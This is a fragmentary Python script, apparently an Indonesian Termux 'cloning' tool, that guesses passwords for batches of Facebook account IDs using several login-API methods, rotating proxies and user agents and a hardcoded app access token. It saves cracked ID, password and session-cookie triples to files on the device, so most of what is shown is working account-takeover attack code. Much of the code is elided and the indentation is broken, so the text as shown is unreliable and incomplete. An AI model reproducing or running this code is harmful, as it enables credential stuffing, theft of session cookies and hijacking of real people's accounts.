#!/usr/bin/python3
#-*-coding:utf-8-*-
#Recoded by SyachPutra78 
#Designed by SyachPutra78 
...
try:
	prox= requests.get('https://raw.githubusercontent.com/SyachPutra78/XyzServer/main/proxies.txt').text
...
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/SyachPutra78/XyzServer/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/SyachPutra78/XyzServer/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
def XyzTimeZone():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning di scriptnya FAMILY UNIKERS INDONESIA"
	elif 12 <= hours < 15:timenow = "Good Afternoon di scriptnya FAMILY UNIKERS INDONESIA"
	elif 15 <= hours < 18:timenow = "Good Evening di scriptnya FAMILY UNIKERS INDONESIA"
	else:timenow = "Good Night kalo sudah main termux langsung tidur"
	return timenow

###-----------------[MAIN LOGO]---------------------####
def pornHubSyachPutra78():
	prints(Panel(f"""{R2}   ╔═╗╔═╗╔╦╗╔═╗╦═╗╔═╗
{R2}   ║  ║ ║ ║║║╣ ╠╦╝╚═╗
{R2}   ╚═╝╚═╝═╩╝╚═╝╩╚═╚═╝
{R2} Author   : Syachputra78
{R2} Github   : https://github.com/SyachPutra78
{R2} Facebook : https://www.facebook.com/profile.php?id=100076695461489&mibextid=kFxxJD""",subtitle=f"1.0.0",title=f"{B2}{XyzTimeZone()}",width=80,padding=(0,4),style=f"#FFFFFF"))
...
def SyachPutra78():
			...
			prints(Panel(f"{P2}[{R2}01{P2}]. File cloning\n{P2}[{R2}02{P2}]. Random cloning\n{P2}[{R2}03{P2}]. Gmail cloning  \n{P2}[{R2}04{P2}]. contact developer",title=f"{M2}• {K2}• {H2}•{P2} MENU {H2}• {K2}• {M2}•",width=80,padding=(0,4),style=f"#FFFFFF"))
			...
			if xd in ['1','01']:
				...
				SyachPutra78.append(Panel(f"Method {H2}for mix ids{P2}",title=f"{R2}01{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
				SyachPutra78.append(Panel(f"Method {H2}for mix ids{P2}",title=f"{R2}02{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
				SyachPutra78.append(Panel(f"Method {H2}fast",title=f"{R2}03{P2}",width=27,padding=(0,6),style=f"#FFFFFF"))
				SyachPutra78.append(Panel(f"Method {H2}for new ids best",title=f"{R2}04{P2}",width=27,padding=(0,6),style=f"#FFFFFF"))
				SyachPutra78.append(Panel(f"Method {H2}for new ids slow",title=f"{R2}05{P2}",width=27,padding=(0,6),style=f"#FFFFFF"))
				SyachPutra78.append(Panel(f"Method {H2}for new ids",title=f"{R2}06{P2}",width=27,padding=(0,6),style=f"#FFFFFF"))
				SyachPutra78.append(Panel(f"Method {H2}for new ids",title=f"{R2}07{P2}",width=27,padding=(0,6),style=f"#FFFFFF"))
				SyachPutra78.append(Panel(f"Method {H2}for new ids",title=f"{R2}08{P2}",width=27,padding=(0,6),style=f"#FFFFFF"))
				Alif-Xyz.print(Columns(SyachPutra78))
				...
				os.system('xdg-open https://www.facebook.com/profile.php?id=100076695461489&mibextid=kFxxJD');time.sleep(2)
				SyachPutra78()
			else:
				print('\n\t\033[0;91m Option not found!');time.sleep(2);AlifXyz()
...
def pak():
		...
		SyachPutra78.append(Panel(f"Method {H2}Best{P2}",title=f"{R2}01{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
		SyachPutra78.append(Panel(f"Method {H2}Fast{P2}",title=f"{R2}02{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
		SyachPutra78.append(Panel(f"Method {H2}v.best{P2}",title=f"{R2}03{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
		SyachPutra78.append(Panel(f"Method {P2}",title=f"{R2}04{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
		SyachPutra78.append(Panel(f"Method {H2}Slow{P2}",title=f"{R2}05{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
		SyachPutra78.append(Panel(f"Method {H2}Slow{P2}",title=f"{R2}06{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
		Alif_Xyz.print(Columns(SyachPutra78))
...
def api1(ids,names,passlist):
		try:
			global oks,loop
			SyachPutra78 = random.choice([H,M,K,B])
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					open('/sdcard/XYZ_OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\033[1;91m [CHECKPOINT] '+ids+' | '+pas+'')
						open('/sdcard/XYZ_CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/XYZ_CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                SyachPutra78 = random.choice([H,M,K,B])
                global oks,loop,sim_id
                sys.stdout.write(f'\r\r\033[0;97m [{SyachPutra78}XYZ-M2\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/XYZ_2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global oks,loop,sim_id
                SyachPutra78 = random.choice([H,M,K,B])
                sys.stdout.write(f'\r\r\033[0;97m [{SyachPutra78}XYZ-M3\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [CHECKPOINT] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/XYZ_CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api4(ids,names,passlist):
        try:
                global oks,loop,sim_id
                SyachPutra78 = random.choice([H,M,K,B])
                sys.stdout.write(f'\r\r\033[0;97m [{SyachPutra78}XYZ-M4\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	SyachPutra78 = random.choice([H,M,K,B])
	sys.stdout.write(f'\r\r\033[0;97m [{SyachPutra78}XYZ-M6\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in XYZ:
				...
				print(f"\033[1;97m[\033[1;92mCOOKIE\033[1;97m]: {kuki}")
				open('/sdcard/XYZ_OK.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
				oks.append(ids)
				break
...
def api7(ids,names,passlist):
	global loop,oks,cps
	SyachPutra78 = random.choice([H,M,K,B])
	sys.stdout.write(f'\r\r\033[0;97m [{SyachPutra78}XYZ-M7\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	SyachPutra78 = random.choice([H,M,K,B])
	sys.stdout.write(f'\r\r\033[0;97m [{SyachPutra78}XYZ-M8\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def xyz1(ids,passlist):
        ...
        global oks
        SyachPutra78 = random.choice([H,M,K,B])
        sys.stdout.write(f'\r\r\033[0;97m [{SyachPutra78}XYZ-M1\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print(f"\033[1;97m[\033[1;92mCOOKIE\033[1;97m]: {coki}")
                                        open('/sdcard/XYZ_OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;91m [CHECKPOINT '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XYZ_CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				print(f"\033[1;97m[\033[1;92mCOOKIE\033[1;97m]: {coki}")
				open('/sdcard/XYZ_OK.txt','a').write(udx+'|'+pas+'|'+coki+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\033[1;91m [CHECKPOINT] '+ids+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;91m [CHECKPOINT] '+str(uid)+' | '+pas+'')
                                        open('/sdcard/XYZ_CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
...
def xyz5(ids,passlist):
        ...
        global oks
        SyachPutra78 = random.choice([H,M,K,B])
        sys.stdout.write(f'\r\r\033[0;97m [{SyachPutra78}XYZ-M5\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						open('/sdcard/XYZ_2F.txt','a').write(uid+'|'+pas+'\n')
					else:
						print(f'\r\x1b[1;32m [SUCCESSFUL] '+uid+' | '+pas)
						print(f"\033[1;97m[\033[1;92mCOOKIE\033[1;97m]: {coki}")
						open('/sdcard/XYZ_OK.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					open('/sdcard/XYZ_CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
